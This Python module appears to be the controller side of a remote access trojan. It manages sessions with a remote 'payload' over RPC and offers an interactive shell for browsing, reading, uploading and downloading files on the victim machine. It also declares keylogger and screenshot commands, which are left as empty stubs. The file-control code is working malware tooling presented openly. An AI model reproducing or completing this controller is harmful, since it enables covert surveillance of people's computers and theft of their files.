# -*- coding: utf-8 -*-

import cmd
import collections
import itertools
import math
import os
import time

from colorama import colorama_text, Fore, Style
from tabulate import tabulate
from tqdm import tqdm

from . import connection
from . import rpc


class SessionCmd(cmd.Cmd):
    ruler = '-'
    nohelp = '*** {}'.format(Style.BRIGHT + Fore.RED + 'No help on %s' + Style.RESET_ALL)

    def __init__(self, session, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.session = session

    @property
    def prompt(self):
        # The 001 and 002 fix an issue.
        # When terminal text wraps, the text overwrites the prompt without these.
        return '({}:{}:{}) '.format(
                self.session.id,
                self.session.username,
                #'\001' + Style.BRIGHT + Fore.BLUE + self.session.id + Style.RESET_ALL + '\002',
                self.session.hostname,
                #'\001' + Style.BRIGHT + Fore.GREEN + self.session.username + '@' + self.session.hostname + Style.RESET_ALL + '\002'
        )

    @property
    def rpc(self):
        return self.session.rpc

    def print_topics(self, header, cmds, cmdlen, maxcol):
        _cmds = []
        for c in cmds:
            _c = c
            if not self._command_supported(c):
                _c = Style.BRIGHT + Fore.RED + '-' + c + Style.RESET_ALL
            _cmds.append(_c)

        return super().print_topics(header, _cmds, cmdlen, maxcol)

    def columnize(self, list, displaywidth=80):
        n = 4
        list = [list[i:i+n] for i in range(0, len(list), n)]
        self.stdout.write(tabulate(list, tablefmt='plain') + '\n')

    def _command_supported(self, name):
        supported = False
        if hasattr(self, 'do_' + name):
            supported = True
        if hasattr(self, 'all_' + name):
            cmd_dir = getattr(self, 'all_' + name)()
            sess_dir = self.session.dir()
            if not all(name in sess_dir for name in cmd_dir):
                supported = False
        return supported

    def cmdloop(self, intro=None, *args, **kwargs):
        '''Handle keyboard interrupts during cmdloop.'''
        with colorama_text(autoreset=True):
            try:
                super().cmdloop(intro=intro, *args, **kwargs)
            except KeyboardInterrupt:
                print()
            else:
                return

            while True:
                try:
                    super().cmdloop(intro='', *args, **kwargs)
                except KeyboardInterrupt:
                    print()
                else:
                    return

    def onecmd(self, line):
        with colorama_text(autoreset=True):
            cmd, arg, line = self.parseline(line)
            if not line:
                return self.emptyline()
            if cmd is None:
                return self.default(line)
            self.lastcmd = line
            if line == 'EOF':
                self.lastcmd = ''
            if cmd == '':
                return self.default(line)

            try:
                func = getattr(self, 'do_' + cmd)
            except AttributeError:
                return self.default(line)

            if not self._command_supported(cmd):
                self.error('Command not supported by remote client')
                return

            return func(arg)

    def error(self, msg):
        print('*** {}'.format(
            Style.BRIGHT + Fore.RED + msg.capitalize() + Style.RESET_ALL,
        ))

    def emptyline(self):
        return

    def default(self, line):
        self.error('Unknown syntax: {}'.format(line))

    def do_exit(self, line):
        '''Return to the main server shell.'''
        return True

    def do_clear(self, line):
        '''Clear the console screen.'''
        os.system('clear')

    def do_info(self, line):
        '''Display remote system information.'''
        header = '\nSystem information (type info <topic>):'
        ruler = self.ruler * len(header)
        info = [
                ['Platform', self.session.platform],
                ['Architecture', 'x86'],
        ]
        table = tabulate(info, tablefmt='plain')
        lines = '\n'.join([header, ruler, table])
        self.stdout.write(lines + '\n\n')


class PayloadSessionCmd(SessionCmd):

    def all_keylogger(self):
        return ['keylogger_start', 'keylogger_dump', 'keylogger_stop']
    
    def do_keylogger(self, line):
        '''Log the keys pressed on the remote machine.'''
        pass

    def all_screenshot(self):
        return ['screenshot']

    def do_screenshot(self, line):
        '''Take a screenshot of the remote machine.'''
        pass

    def all_ls(self):
        return ['list_dir', 'get_current_dir']

    def do_ls(self, line):
        '''List a directory from the remote machine.'''
        path = line
        if not path:
            path = '.'

        try:
            listing = self.rpc.list_dir(path)
        except FileNotFoundError:
            self.error('No such file or directory: {}'.format(path))
        except NotADirectoryError:
            self.error('Not a directory: {}'.format(path))
        else:
            directory = path
            if directory == '.':
                directory = self.rpc.get_current_dir()
            header = 'Directory listing ({}):'.format(directory)
            ruler = self.ruler * len(header)
            print()
            print(header)
            print(ruler)
            self.columnize(listing)
            print()

    def all_cd(self):
        return ['change_dir']

    def do_cd(self, line):
        '''Change the current working directory of the remote machine.'''
        path = line
        if not path:
            path = '~'
        try:
            self.rpc.change_dir(path)
        except FileNotFoundError:
            self.error('No such file or directory: {}'.format(path))
        except NotADirectoryError:
            self.error('Not a directory: {}'.format(path))

    def all_pwd(self):
        return ['get_current_dir']

    def do_pwd(self, line):
        '''Print the current working directory of the remote machine.'''
        print(self.rpc.get_current_dir())
    
    def all_cat(self):
        return ['open_file']

    def complete_cat(self, text, line, begidx, endidx):
        files = self.rpc.list_dir('.')
        if not text:
            return files
        return [f for f in files if f.startswith(text)]

    def do_cat(self, line):
        '''Display the contents of a remote file.'''
        name = line
        try:
            with self.rpc.open_file(name, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    try:
                        chunk = chunk.decode()
                    except UnicodeDecodeError:
                        pass
                    print(chunk)
        except (FileNotFoundError, IsADirectoryError) as e:
            self.error(str(e))

    def all_upload(self):
        return ['open_file', 'write_file']

    def do_upload(self, line):
        '''Upload a file to the remote machine.'''
        try:
            local_path, remote_output = line.split()
        except ValueError:
            return

        file_size = os.path.getsize(local_path)
        with open(local_path, 'rb') as lf, self.rpc.open_file(remote_output, 'wb') as rf:
            chunk_size = 1024
            l_bar = '{desc}: {percentage:.0f}%|'
            bar_fmt = l_bar + '{bar:20}{r_bar}'
            print('Uploading file: {} ...'.format(local_path))
            with tqdm(
                    desc='  {}'.format(local_path),
                    bar_format=bar_fmt,
                    ascii=False,
                    colour='blue',
                    unit="B",
                    unit_scale=True,
                    unit_divisor=chunk_size,
                    total=file_size,

            ) as progress:
                while True:
                    chunk = lf.read(chunk_size)
                    if not chunk:
                        break
                    rf.write(chunk)
                    progress.update(len(chunk))
        print('Upload complete.')

    def all_download(self):
        return ['get_file_size', 'open_file', 'read_file']

    def do_download(self, line):
        '''Download a file from the remote machine.'''
        try:
            remote_path, outpath = line.split()
        except ValueError:
            return

        file_size = self.rpc.get_file_size(remote_path)
        outfile = open(outpath, 'wb')
        try:
            with self.rpc.open_file(remote_path, 'rb') as f:
                chunk_size = 1024
                l_bar = '{desc}: {percentage:.0f}%|'
                bar_fmt = l_bar + '{bar:20}{r_bar}'
                print('Downloading file: {} ...'.format(remote_path))
                with tqdm(
                        desc='  {}'.format(remote_path),
                        bar_format=bar_fmt,
                        ascii=False,
                        colour='blue',
                        unit="B",
                        unit_scale=True,
                        unit_divisor=chunk_size,
                        total=file_size,

                ) as progress:
                    while True:
                        chunk = f.read(chunk_size)
                        if not chunk:
                            break
                        outfile.write(chunk)
                        progress.update(len(chunk))

        except (FileNotFoundError, IsADirectoryError) as e:
            self.error(str(e))
        finally:
            outfile.close()
        print('Download complete.')


class Session:
    
    def __init__(self, socket):
        self.sock = socket
        self.connection = connection.Connection(socket)
        self.rpc = rpc.RPCProxy(self.connection)
        self.last_response = time.time()
        self._username = None
        self._hostname = None
        self._dir = None
        self._platform = None

    @property
    def username(self):
        if self._username is None:
            self._username = self.rpc.get_username()
        return self._username

    @property
    def hostname(self):
        if self._hostname is None:
            self._hostname = self.rpc.get_hostname()
        return self._hostname

    @property
    def platform(self):
        if self._platform is None:
            self._platform = self.rpc.get_platform()
        return self._platform

    def dir(self):
        '''Returns a list of registered rpc functions.'''
        if self._dir is None:
            self._dir = self.rpc.dir()
        return self._dir

    def close(self):
        self.connection.close()


class SessionContainer:

    def __init__(self):
        self._sessions = collections.OrderedDict()
        self._counter = itertools.count()

    def __bool__(self):
        return bool(self._sessions)

    def __iter__(self):
        return iter(self._sessions)

    def __getitem__(self, name):
        return self._sessions[name]

    def __getattr__(self, name):
        return getattr(self._sessions, name)

    def _generate_id(self):
        return '{:x}'.format(next(self._counter))

    def add(self, session):
        sess_id = self._generate_id()
        self._sessions[sess_id] = session
        session.id = sess_id

    def remove(self, session):
        del self._sessions[session.id]

